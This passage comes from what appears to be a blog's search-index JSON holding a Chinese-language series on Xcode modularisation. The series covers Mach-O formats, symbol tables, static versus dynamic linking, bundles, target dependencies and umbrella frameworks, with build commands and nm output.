references.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(13)：多版本和Umbrella Framework","date":"2017-07-12T15:00:00.000Z","path":"2017/07/13/模块化13Framework与多版本和UmbrellaFramework/","text":"Mac Framework &amp; iOS Framework在苹果的体系里，最早用上Framework的是Mac OS，其文档中关于Framework 描述了Umbrella Framework和多版本的概念 Framework多版本根据Framework文档的版本章节还提及了Framework有多版本兼容的能力，这个曾经也听人提及过，但是经过实际操作发现结论 在iOS中目前不存在Current目录的软链接，不存在Mac中多版本兼容的能力 Git对比工程配置通过Git来对比 MacFramework.xcodeproj 和 iOSFramework.xcodeproj 的内部project文件发现工程配置主要会存三点不同 Target不同，因为Mac和iOS的差别 SDK的不同 Run Search Paths 不同，Mac 的多了一个 /../ 上级目录的路径 查看日志对比命令通过查看编译命令，可以发现存在以下不同 阶段 Mac iOS Process info.plist 无 有 Copy module.modulemap 无 有 Sign 是对Framework Version进行签名 是对Framework本身进行签名 所以说 推测是Xcode对于不同平台的Framework进行编译时采用的命令不同而导致的 Umbrella Framework根据苹果官方指导，着重提及了一点 Don’t Create Umbrella Frameworks 而且这个文档主要是针对Mac OS来讲的，iOS中并没有这个概念 根据StackOverflow制作Umbrella Framework的问答，得到了以下的 均为错误的回答 Embedding a framework within a framework (iOS 8+): 存在SubFramework头文件问题 How to create an umbrella framework in iOS SDK?: Xcode5时代的答案，已经失效 How to add a framework inside another framework (Umbrella Framework): 讨论没有有效的结果 Umbrella framework: 同上述1、3同样是Embed Framewrok的方法，并不是Umbrella Framework 就是提醒大家，没有特殊需求不要创建 Umbrella FrameWork ，但是无奈公司就有这个特殊需求，经过分析 所谓 Umbrella Framework 完成的需求需要符合以下几点 你的Target是提供一个Framework给别人，注意是 ！一个！ 你的Target依赖了多个Framework 你的Target和所依赖的Framework都是由你本人编写，保证不会和任何外部依赖冲突 由于需要提供 一个 Framework给外部，防止外部需要加载多个Framework的问题，所以根据需求 我们制作出了上文Link和符号表关系中提到的Unique Framework 会在后文继续讲解，而其前提是对Framework进行静态编译","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与Framework(12)：Framework的基本介绍","date":"2017-07-11T15:00:00.000Z","path":"2017/07/12/模块化12Framework与Framework的基本介绍/","text":"Framework 的基本使用经过上文分析，如果使用了静态库，需要提交给使用者的包含 头文件(.h) 静态库(.a) 资源文件(.bundle) 三种，十分麻烦，而如果想要使用Framework，只需要在主工程的 Target.app ———— General ———— Embedded Binaries 里添加.framework 即可， 使用这种方式添加其实是自动执行了以下两步 添加.framework 进入 Linked Framework and Libraries 在Build Phase里添加了一个名为 Embed Frameworks的 Copy Files操作 其中第二步的Copy Files也可以自己手动设置，选择 Destination 为 Framework 然后点击下文的加号添加即可，如果缺少这个则会在真机调试的时候报这个错误 123dyld: Library not loaded:....................Reason: image not found 这是因为 一个App最终真机运行时所有Framework.framework都必须被Embedded进来，不能仅仅依赖最上层的Framework Framework的头文件系统Framework还有一个特性是带有头文件的管理系统 头文件存在Public/Private/Project的分层系统，仅有Public的头文件对外界可见 可以通过一个Umbrella Header的概念进行一次性公开头文件 Umbrella头文件和modulemap在C语言中最大的痛点，就是 #include 的时候会重复加载代码，所以LLVM提出了使用 import关键字代替include 而如何管理所有的头文件就是利用 modulemap 文件，其语法类似JSON, Apple Framework会自动生成 module.modulemap 123456789&#x2F;&#x2F;位于 SharedLib.framework&#x2F;Modules&#x2F;module.modulemapframework module SharedLib &#123; umbrella header &quot;SharedLib.h&quot; &lt;&#x3D;&#x3D;&#x3D;指定同名头文件为umbrella header export * &lt;&#x3D;&#x3D;&#x3D; 导出所有Module module * &#123; export * &#125; &lt;&#x3D;&#x3D;&#x3D; 把每一个头文件都作为一个单独的Module，并导出&#125; 更多可以参考LLVM官方文档","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Framework","slug":"Framework","permalink":"http://yoursite.com/tags/Framework/"}]},{"title":"模块化与StaticLib(11)：StaticLib互相Link不Duplicated的原因","date":"2017-07-10T15:00:00.000Z","path":"2017/07/11/模块化11Xcode与StaticLib互相Link不Duplicated的原因/","text":"StaticLib的编译命令在上文Target和Link的关系中我们可以得知，Static Lib在编译后使用的是 Create Static 而不是真正的Link 12XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;libtool -static ..... 得到的符号表，可以通过符号表文章的对比得知，是一堆.o文件的压缩包 12345678910111213.....&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;.....&#x2F;libStaticLib.a(StaticLib.o): &lt;&#x3D;&#x3D;&#x3D;&#x3D;看这里0000000000000000 t -[StaticLibObj init]......................00000000000001e8 s l_OBJC_METACLASS_RO_$_StaticLibObj.....&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;.....&#x2F;libStaticLib.a(StaticLibObj.o): &lt;&#x3D;&#x3D;&#x3D;&#x3D;看这里0000000000000000 t -[StaticLibObj init]......................00000000000000d8 S _OBJC_CLASS_$_StaticLibObj........... 不会Duplicated的原因仔细观察符号表，我们可以发现一些规律 StaticLib内部的 .o 文件是互相独立的 每一个 .o 文件都是从 0000000000000000 地址开始计数 当StaticLib真正执行Link命令成为 Target.app 或者 Dynamic.framework 时，符号表则变成了一个连续地址的Mach-O文件 也就是说 两个 StaticLib.a 中存在相同的 .o 文件，他们两个也是完全一样的，会在Link时的只有一个被Link 就像拷贝文件一样，如果存在一个同名的 .o 文件，后一个相同的 .o 文件就会拷贝失败，只使用了第一个 验证如果存在以下Link模型，按照上述理论，StaticLib.a 的 .o 会在 A 和 B 中共同存在，在最终进入App时，因为互相覆盖不报错 为了验证，我们 将StaticLib.a的类 Object 文件拷贝进入 Duplicate-A 取消掉StaticLib.a 对 A 的Link 更改Duplicated-A内 Object.m 内方法的NSLog日志 再次Build，发现执行的是 StaticLib.a 中的方法日志 123452017-11-12 20:57:05.908741+0800 Static Lib Obj 0x60c000000fe0 init....2017-11-12 20:57:05.908854+0800 Static Lib attached Obj to Dupilcate A 0x60c000000fe0 init....2017-11-12 20:57:05.908938+0800 Static Lib Obj 0x604000000b10 init....2017-11-12 20:57:05.909010+0800 Static Lib attached Obj to Dupilcate B 0x604000000b10 init.... 然后我们更改App中 Link 顺序，再次Build运行，发现执行了 Duplicated-A中 Object.m的方法 123452017-11-12 20:30:29.373910+0800 Duplicated Static Lib Obj 0x608000018390 init....2017-11-12 20:30:29.374015+0800 Static Lib attached Obj to Dupilcate A 0x608000018390 init....2017-11-12 20:30:29.374085+0800 Duplicated Static Lib Obj 0x600000017e00 init....2017-11-12 20:30:29.374138+0800 Static Lib attached Obj to Dupilcate B 0x600000017e00 init.... 结论根据日志分析，App会使用第一次Object.o文件，而不是后一个 当使用了 StaticLib.a 中的NSLog时，Link顺序为 1......&#x2F;usr&#x2F;bin&#x2F;clang -arch x86_64 -lDuplicateB -lDuplicateA ....... 当使用了 Duplicate-A 中的NSLog时，Link顺序为 12......&#x2F;usr&#x2F;bin&#x2F;clang -arch x86_64 -lDuplicateA -lDuplicateB .......","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Xcode(10)：LinkBinaryWithLibraries和符号表的关系","date":"2017-07-09T15:00:00.000Z","path":"2017/07/10/模块化10Xcode与LinkBinaryWithLibraries和符号表的关系/","text":"Link 的类型根据上文我们知道，可以被Link的有 StaticLib.a(静态库) 和 Dynamic.framework(动态库) 可以进行Link，而其本身的Mach-O文件符号表也是不同的 Link 符号表类型 StaticLib.a .o文件的压缩包 Dynamic.framework 可以执行的Mach-O文件 Link Binary 的结果在项目复杂的引用关系中会，让人产生疑惑的是代码最终都存在于哪个Mach-O文件 我们可以根据需要Link的对象，以及Link的目标结果整理出一张表，可能性公存在6种 Link Component To Module Explain Enter OR Not Result Mach-O Backup StaticLib.a StaticLib.a 静态库–&gt;静态库 Enter StaticLibrary 组成新的静态库，包含了两者所有的.o文件，仍是.o文件压缩包 StaticLib.a Dynamic.framework 静态库–&gt;动态库 Enter DynamicLibrary 静态库的代码进入了动态库，组成新的动态库 Dynamic.framework StaticLib.a 动态库–&gt;静态库 Not DynamicLibrary+StaticLibrary 两者都不会产生任何变化，动态库代码不会进入静态库 Dynamic.framework Dynamic.framework 动态库–&gt;动态库 Not DynamicLibrary+DynamicLibrary Component的Class会以 U（未定义） 的形式进入 Module StaticLib.a App 静态库–&gt;App Enter Executable 静态库的代码进入了App，组成了可执行文件 Dynamic.framework App 动态库–&gt;App Not Executable+DynamicLibrary 动态库以拷贝的形式进入App的Frameworks文件夹(包含了代码和资源)，但是不会进入App的Mach-O 总结来看就是静态库Mach-O会进入所有的静态库/动态库/App的Mach-O,动态库不会进入任何的Mach-O文件，运行App也是通过资源拷贝的形式拷贝进去 疑问叉状引用静态库为何不出现重复的符号在工程中常见的就是混乱的叉状引用关系 ![image01][image01] 根据以上结论，其中StaticLibA（包含A与B的Mach-O），而App（包含B的Mach-O）按照上述理论应该会出现Duplicated Symbols的错误 但是在实际执行的过程中并不会出现 原因会在下文分析 静态的Framework(不推荐，没有需求不要看了)这个本身是个错误的概念参考StackOverflow回答，指的是用一个framework包起来Static Lib和头文件，！！是一种不被官方支持的方法！！ 但是根据一种特殊的需求—————————— Unique Framework Unique Framework的概念: Unique Framework是类似Mac系统中Umbrella Framework的概念，但是官方并没有提供支持的方法 和 Fat Framework的别称 Universal Framework不是一个概念 这个名字是我自己瞎起的 我们还是可以尝试修改Build Setting——Linking——Match-O Type，来决定以什么样的命令处理Target 试将 .framework的 Match-O Type改为 StaticLibrary 即得到 Mach-O 为 Static 的framework文件，下文后续会详细介绍","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Xcode(09)：TargetDependencies的正确用法","date":"2017-07-08T15:00:00.000Z","path":"2017/07/09/模块化09Xcode与TargetDependencies的正确用法/","text":"Target Dependencies正如上文所说，Target Dependencies是在Project内决定编译该Target之前需要先编译哪些其它的Target Project Multiple Target常见的操作是在一个Project项目包含多个Target时，可以仅仅编译一个Target就产生多个最新的Product文件，例如需求： Project内有3个Target Playground.app(主程序) BaseModule.a(基础模块) NetModule.a(网络模块) 其中两个模块在Playground更新时上传到公共服务器 1234Project ------Playground.app ------BaseModule.a ------NetModule.a 其中可以将 BaseModule.a 和 NetModule.a 加入 Playground.app的 Target Dependencies,那么此时为了不用手动去编译这两个模块 Run Playground.app Build BaseModule.a Build NetModule.a Build Playground.app sh script upload BaseModule.a &amp; NetModule.a 触发Build BaseModule和 NetModule 编译 编译 完成Playground编译 执行上传脚本 此时可以保证 Playground.app 编译时自动编译两个模块，并且可以通过脚本完成自动上传 为StaticLib准备Bundle还有一种常见的操作就是通过Target为Static准备Bundle，因为静态库本身无法携带资源，所以需要一个Bundle Target来携带图片等资源 那么在代码的编写过程中，图片资源更新都需要重新编译Bundle，可以使用Target Dependencies 以保证资源为最新版 新建一个Bundle Target，根据需要修改SDK的类型 添加图片 对Bundle Target同一个 xcodeproj 下的Static Lib Target添加Target Dependences 在 Target.app 的Project中拖入 Bundle的Project，注意是Project套Project，不是同一个Workspace即可 拖动Product内的 Bundle 以相对路径进入Target.app 的Build Phase——Copy Bundle Resources 检查该 Target.app 的 Copy Bundle Resources中路径是否是 build/Debug-iphoneos/ 步骤3 步骤4-5 通过以上设定，就可以在产生以下步骤 Run Target.app Build StaticLib.a Build Bundle Build Target.app Target.app Copy Bundle Resources 触发Build StaticLib.a 触发其Target Dependencies 重新编译Bundle 完成Target编译 从Build路径Copy，此时已经为最新的","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Xcode(08) Target和Workspace、Project的关系","date":"2017-07-07T15:00:00.000Z","path":"2017/07/08/模块化08Xcode与Target和WorkspaceProject的关系/","text":"Scope的概念Xcode的工程中存在Scope的概念会影响到Xcode的工程配置，主要是以下为主 和Scope相关的工程配置 Setting Scope 作用 Target Dependencies Project 编译当前Target时先编译另一个 Linked Binary With Libraries WorkSpace 组合符号表，完成Mach-O文件的生成 Embedded Binaries WorkSpace 一步完成Link和Copy资源两步操作 Target DependenciesTarget Dependencies 首先是可视范围仅仅在Project之内的Target之间，Target只能操作Project内的对象 真正的作用仅有一项，用于在 编译当前Target时，优先编译另外一个Target ，这也是为什么可视范围只有Project的原因 经过测试Target Dependencies 的顺序也会对编译先后产生影响，应该只是产生编译命令时候的配置文件导致的，该特性并不完全可靠 Linked Binary With LibrariesLinked Binary With Libraries 的Scope范围是整个Workspace，其可以操作Workspace内所有可以被Link的对象 所谓可以被Link的对象就是 .a 和 .framework 也就是Mach-O为 DynamicLibrary 和 StaticLibrary的 对象，Link的结果会决定Mach-O文件如何生成(后续详细讨论) Embedded Binaries我们在上述文章里提到，Framework是代码和资源的集合，所以Xcode加入了 Embedded 这个操作来处理Framework，可以一键执行两步动作 把Framework加入Linked Binary With Libraries 在Build Phase里创建 Embed Frameworks的步骤，进行对Framework资源的拷贝 常见的错误观点Framework时需要同时添加 Target Dependencies 和 Link Binary With Libraries在苹果的官方文档和Stack Overflow中对Target Dependencies的提示多数会搜到这个答案 正确答案是 Framework只需要Embedded Target Dependencies 和 Linked Binary With Libraries 会对当前 Target.app 的依赖是否会重新编译一个较新版正确答案是 无论采用何种配置，Target.app 都会重新编译当前 WorkSpace 中所依赖的其它对象，如.a或.framework，如果工作目录存在缓存则会省去Compile的时间","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Xcode(07)：Target和Resource的关系","date":"2017-07-06T15:00:00.000Z","path":"2017/07/07/模块化07Xcode与Target和Resource的关系/","text":"如何加载资源在传统使用StaticLib的时候，需要一个Bundle文件来承载资源文件，并且将其拷贝进入主工程 根据本系列文章02Mach-O文件类型的分析，Bundle是一个 可以被dlopen()的动态库 但是Framework自身就是动态库，所以拥有Bundle的能力 Bundle加载方法 Bundle Framework bundleForClass NO YES bundleWithPath YES YES bundleWithURL YES YES 通过class来加载Bundle从上文看，使用Framework不用考虑Bundle查询的问题，只需要对Framework内部的Class取class就可以获得默认的Bundle 12&#x2F;&#x2F;FrameworkNSBundle *bundle &#x3D; [NSBundle bundleForClass:[self class]]; 通过Path/URL来加载Bundle普通的Bundle则需要获取Bundle的路径(需要自己确认)，可以用以下函数 12345&#x2F;&#x2F;app资源目录路径NSString *resPath &#x3D; [[NSBundle mainBundle] resourcePath];&#x2F;&#x2F;获取资源目录下a.bundleNSString* path &#x3D; [resPath stringByAppendingPathComponent:@&quot;&#x2F;StaticLib.bundle&quot;];NSBundle *bundle &#x3D; [NSBundle bundleWithPath:path]; 在静态库使用Bundle的过程中需要注意： 最终的bundleWithPath应该是你的那个Bundle在App里的路径，如果找不到，可以用模拟器Build出来，用Finder去看看，是不是路径错了 静态库创建Bundle的Target需要在MacOS的选项卡下，iOS没有，然后BuildSetting——Base SDK改为iOS，不然可能引起编译中一些签名问题 静态库的Bundle要手动(脚本)的方式拷贝到Target.app 从Bundle中获取资源Bundle必须 在Load之后 才可以被读取资源,可以用isLoad来检查是否已经Load 123456789101112&#x2F;&#x2F;从Bundle获取图片UIImage *image &#x3D; [UIImage imageNamed:@&quot;image&quot; inBundle:bundle compatibleWithTraitCollection:nil];&#x2F;&#x2F;从Bundle加载字符串NSLocalizedStringFromTableInBundle(&lt;#key#&gt;, &lt;#tbl#&gt;, &lt;#bundle#&gt;, &lt;#comment#&gt;)&#x2F;&#x2F;从Bundle加载Storyboard[UIStoryboard storyboardWithName:&lt;#(nonnull NSString *)#&gt; bundle:&lt;#(nullable NSBundle *)#&gt;]&#x2F;&#x2F;从Bundle加载Xib[UINib nibWithNibName:&lt;#(nonnull NSString *)#&gt; bundle:&lt;#(nullable NSBundle *)#&gt;]","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Xcode(06)：Target和Class进行Load的关系","date":"2017-07-05T15:00:00.000Z","path":"2017/07/06/模块化06Xcode与Target和Class进行Load的关系/","text":"不同Mach-O如何Load根据苹果的WWDC视频介绍，App在运行时采用COW(Copy Of Write)策略 会将需要运行的程序先拷贝一份，然后依次加载其需要dylib 这种机制就造成不同的Mach-O会有不同的执行策略 Static Mach-O经过nm指令分析，对于 lib.a 的 Static Mach-O 并不是可运行的二进制文件，而是一组.o文件的压缩包，并且不会进行Duplicated Symbols检查 其会随着主程序启动一起启动，原因是其最终进入了主程序的Mach-O（会在后续进行详细分析） Dynamic Mach-O对于Framework其本身已经和主程序没有任何区别，理论上只要不存在Undefined Symbols 其是可以单独运行的Mach-O文件，并且不存在重复的符号 其会晚于主程序启动，并且其启动的过程是可控，并且和主程序不是一个Mach-O(后续会详细分析) StaticLib 和 Framework 的区别StaticLib 被称为静态库，Framework可以被称为动态库，但是其也可以作为静态库来编译(后续会有分析)除去编译命令不同，Framework对比StaticLib还具有以下特点 自身可以携带头文件，不用像StaticLib配置头文件搜索目录 自身可以携带资源文件 自身可以进行头文件的权限处理，如Public Project Private Framework之所以好，是因为其把 HeaderFile Resources ExecutableFile 放在了一起，为模块化提供了很好的基础 Function 基于技术 Header File LLVM中的 modulemap 技术 Resources Apple的dlopen函数可以运行时读取 ExecutableFile Apple的Mach-O文件 Framework 的延迟加载Framework与静态库最大的不同是可以做到延迟加载，根据苹果的WWDC视频介绍在App启动后，会依次对动态库进行加载，但是也可以通过配置控制在第一次使用到时进行加载 添加完Framework默认是不延迟加载的，会严重影响App启动速度，设置延迟加载的方式是 在Linked Framework and Libraries中将右侧的选项至为Optional 这里有个经验是 如果Target.app的二进制可执行文件过大，可能会不通过苹果的审核，使用Framework(Dynamic Mach-O)会减小App的可执行文件体积","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Compile(05)：Target和Link的关系","date":"2017-07-04T15:00:00.000Z","path":"2017/07/05/模块化05Compile与Target和Link的关系/","text":"Target和Mach-O的Link命令对于不同的Target，例如常见的 StaticLibrary 和 DynamicLibrary 以及 Executable 其Mach-O文件使用的Link命令也是不同的 通过Xcode的日志查询文件 Report Navigator可以看到具体过程 StaticLibrary，Target=lib.a查看在Run lib.a的时候调用的命令 libtool 完成的链接过程，并且把这一个过程称为 Create static Library 1234XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;libtool -static ........ -arch_only ..... -syslibroot ...... -filelist ..... XXX.LinkFileList....... -o DynamicLibrary，Target=lib.framework而在对 lib.framework 的时候调用的命令 clang 完成了链接过程 并且与Static不同，其把过程称为Link, 并且加载了一堆 Xlinker 指令， 123456XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;clang ......... -arch ..... -dynamiclib ... -syslibroot ...... -filelist ..... XXX.LinkFileList....... -dead_strip ... -Xlinker... -o Executable，Target=demo.app而在对 demo.app Link时 同样是调用的命令 clang 完成了链接过程， 具体参数与 DynamicLibrary 有一些不同 1XcodeDefault.xctoolchain&#x2F;usr&#x2F;bin&#x2F;clang ...... -filelist ..... -Xlinker .... 参数说明具体说明可以使用 man clang 来查看，仅列举上文出现的 参数 备注 -arch_only，-arch 生成的架构 -syslibroot 系统库System Library Root -dynamiclib 生成动态库 -filelist 要执行的File列表 -o 输出文件 -dead_strip 文章03中提到的Strip过程等级 -Xlinker 对Link过程中的参数输入 区别与总结Static可以看到.o的原因由本系列文章第四章模块化04符号表可以知道Static Library和Dynamic Library的符号表是不一样的，Static可以看到.o文件的原因就是使用 libtool 命令进行create Duplicated Symbols而Executable 和 DynamicLibrary 在Clang指令的-Xlinker 列表中存在一个重要的指令 -Xlinker -no_deduplicate 代表不能存在重复的符号 但是在Create Static中不存在该输入，而且每个.o文件都是分开的，所以说Static Create并不能进行重复符号的检查 通过Dulpicated错误验证通常情况下，存在如下两个类，而且全部处于同一个Target的Source Files里，因为类名相同必然会报错，参考编译错误duplicate symbols 123456789101112131415161718192021222324&#x2F;&#x2F;文件1 ModuleBeta.m#import &quot;ModuleBeta.h&quot;@implementation ModuleBeta- (NSString *)description &#123; return [NSString stringWithFormat:@&quot;%@ Beta Instance&quot;, [super description]];&#125;@end&#x2F;&#x2F;文件2 ModuleTheta.m#import &quot;ModuleTheta.h&quot;@implementation ModuleBeta- (NSString *)description &#123; return [NSString stringWithFormat:@&quot;%@ Beta Instance&quot;, [super description]];&#125; 但是通过对target.a进行Run，仍然可以得到Build Success，也就是说libtool命令进行Create通过 Create != Link也就是说在不同的Target情况，使用的Link指令存在差别，并且静态库被称为Create而不是真正的Link，所以不会做Duplicated的符号检查","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Compile(04)：符号表","date":"2017-07-03T15:00:00.000Z","path":"2017/07/04/模块化04Compile与符号表/","text":"符号表Mach-O文件中最为重要的就是符号表，其标记了虚拟内存地址和可执行方法和变量的映射关系，可以使用 nm命令 ，根据介绍 nm是Xcode对llvm-nm命令的一个封装. 1234567NAME nm - display name list (symbol table)......DESCRIPTION As of Xcode 8.0 the default nm(1) tool is llvm-nm(1)..... 查看符号表通过命令 nm …/../../libStaticLib.a 可以查看到静态库的Mach-O文件类似如下显示，可以清晰的看到每个.o文件 1234567891011121314.....&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;.....&#x2F;libStaticLib.a(StaticLib.o):0000000000000000 t -[StaticLibObj init]......................00000000000001e8 s l_OBJC_METACLASS_RO_$_StaticLibObj.....&#x2F;Library&#x2F;Developer&#x2F;Xcode&#x2F;DerivedData&#x2F;.....&#x2F;libStaticLib.a(StaticLibObj.o):0000000000000000 t -[StaticLibObj init]00000000000000a0 t -[StaticLibObj selectorInStaticLibraryObjFix] U _NSLog U _OBJC_CLASS_$_NSObject00000000000000d8 S _OBJC_CLASS_$_StaticLibObj...................... 而通过命令 nm …/../../DynamicFrame.framework/DynamicFrame 进行查看可以得到如下符号表，并没有区分具体的.o文件 1234567891011121314150000000000000dd0 t -[DynamicFrameObj init]0000000000000e70 t -[DynamicFrameObj selectorInDynamicFrameObj]0000000000000fa8 S _DynamicFrameVersionNumber0000000000000f70 S _DynamicFrameVersionString U _NSLog0000000000001158 S _OBJC_CLASS_$_DynamicFrameObj U _OBJC_CLASS_$_NSObject0000000000001180 S _OBJC_METACLASS_$_DynamicFrameObj U _OBJC_METACLASS_$_NSObject U ___CFConstantStringClassReference U __objc_empty_cache U _objc_msgSendSuper2 U _objc_retain U _objc_storeStrong U dyld_stub_binder 具体的原因将在后续进行说明","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Symbols","slug":"Symbols","permalink":"http://yoursite.com/tags/Symbols/"}]},{"title":"模块化与Compile(03)：Undefined和Duplicate","date":"2017-07-02T15:00:00.000Z","path":"2017/07/03/模块化03Compile与Undefined和Duplicate/","text":"Link过程中的错误在 Mach-O文件中TEXT和DATA部分对每个方法和变量都称之为符号(Symbol)，并且让每一个符号和内存地址存在映射关系 Undefined12**Undefined symbols for architecture ....... objc-class-ref in XXX.o** （未定义的符号） 本质原因 当源文件中某行代码想使用某个变量或者方法时，在Mach-O中找不到对应的内存地址，所以说认为该符号(Symbol)不存在、未定义 可能出现的情况为 与.h对应的.m文件中没有实现对应的方法，且该方法被使用了 程序所依赖的lib.a或者lib.framework中不存在某种架构下x86的二进制文件 Duplicated12**Duplicated symbols for architecture ....... objc-class-ref in XXX.o** （重复的符号） 本质原因 当Mach-O想生成某个符号和地址的映射时，发现已经存在该符号和一个地址的映射，如果再次写入该符号(Symbol)将存在两个，无法进行区分 可能出现的情况是 在两个.m文件中存在相同的Class 在当前工程中的某个.m文件中存在和依赖库或者 符号表会受到的影响生成符号表的Link过程会受到Other Link Flag和Strip设置的影响，不是100%会出现报错，将会在后续文章中讨论","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Compile(02)：Mach-O文件","date":"2017-07-01T15:00:00.000Z","path":"2017/07/02/模块化02Compile与Mach-O文件/","text":"Mach-O文件的来源根据Wiki描述Mach-O为Mach Object文件格式的缩写，其由卡耐基梅隆大学和Apple开发和维护 Mach-O的格式Mach-O分为多个格式 Mach-O格式 说明 Executable 可执行程序，可运行的App最终会变成这个 Bundle 不可以被Link的动态库，运行时可以通过NSBundle基于dlopen方法加载 StaticLibrary 静态链接,Xcode默认情况下.a库会使用 DynamicLibrary 动态链接,Xcode默认情况下.framework会使用 RelocatableObjectFile 是编译过程中的中间产物，就是.o文件 Mach-O文件的结构根据苹果的WWDC视频介绍，任何一个Mach-O的可执行文件(dylib和executable)可以分为三个区域 Mach-O区域 权限 作用 TEXT r-x读和执行 保存mach-o的文件头可执行的code以及constant常量 DATA rw-读写 保存用于程序的全局和静态变量 LINKEDIT r–只读 保存该库meta data，用来表示怎么加载 Universal Mach-O &amp; Fat Mach-O &amp; 多架构Framework一个Mach-O可以包含多种架构，这种方式被苹果官方称为 Universal Mach-O， 俗称Fat Mach-O Fat-Framework等等，可以使用lipo工具进行组合和拆解 12345678910111213|---------------|| Fat Header ||---------------|| _TEXT | &lt;&#x3D;&#x3D;&#x3D; x86 architecture| _DATA || _LINKEDIT ||---------------|| _TEXT || _DATA | &lt;&#x3D;&#x3D;&#x3D; arm64 architecture| _LINKEDIT ||---------------| 查看这个Mach-O文件包含了哪些架构可以使用 1234lipo -info ...&#x2F;..&#x2F;..&#x2F;XXXX&#x2F;&#x2F;Output&#x2F;&#x2F;libStaticLib.a is architecture: x86_64","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Compile(01)：编译过程","date":"2017-06-30T15:00:00.000Z","path":"2017/07/01/模块化01Compile与编译过程/","text":"Xcode工程模块化工程化的最大需求就是模块解耦，最近在整理一个旧工程，各种乱七八糟的引用关系不敢乱删，有复习了下大学学的编译过程，找到了一一对应，最终把一个大工程拆成了几个独立的Project。 Xcode和编译过程的对应关系面试的时候被好多人问过编译过程分哪几步，好多人会被问懵逼。。。这里简单提示一下 中文 预编译 编译 汇编 链接 英文 Preprocess Compile 